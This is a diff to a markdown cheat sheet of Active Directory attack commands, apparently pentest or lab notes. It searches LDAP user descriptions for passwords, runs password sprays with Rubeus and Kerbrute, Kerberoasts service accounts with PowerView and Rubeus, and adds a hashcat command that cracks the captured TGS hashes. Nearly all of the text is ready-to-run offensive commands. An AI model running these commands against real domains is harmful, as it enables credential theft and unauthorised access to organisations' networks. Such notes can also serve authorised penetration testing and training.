@@ -1,13 +1,11 @@
 # 1. Sensitive Data in LDAP
 
-1.) Start ADExplorer and search through the AD for sensitive information
-
+## Start ADExplorer and search through the AD for sensitive information
 PS> adexplorer.exe
 
 ADexplorer> search user description field contains pw, pwd, password, pass
 
-2.) Enumerate the AD with ADRecon
-
+## Enumerate the AD with ADRecon
 PS> .\ADRecon.ps1
 
 PS> .\ADRecon.ps1 -GenExcel .\ADRecon-Report-timestamp
@@ -15,13 +13,11 @@ PS> .\ADRecon.ps1 -GenExcel .\ADRecon-Report-timestamp
 TODO: wget Excel file since Excel will not be installed
 
 # 2. Password Spraying
-
-1.) Identify the standard domain password and start a password spray attack
-
-a.) Use Rubeus
+## Identify the standard domain password and start a password spray attack
+### Use Rubeus
 PS> .\Rubeus.exe brute /password:Start123!
 
-b.) Use Kerbrute
+### Use Kerbrute
 PS> Invoke-WebRequest "https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_amd64.exe" -OutFile ".\kerbrute.exe"
 
 PS> Import-Module .\PowerView.ps1
@@ -69,3 +65,8 @@ PS> Invoke-Kerberoast | % { $_.Hash } | Out-File -Encoding ASCII kerberoasted.tx
 
 ### Rubeus
 PS> .\Rubeus.exe kerberoast /outfile:kerberoasted.txt
+
+## Crack TGS tickets
+PS> hashcat -a 0 -m 13100 kerberoasted.txt /usr/share/wordlists/rockyou.txt
+
+
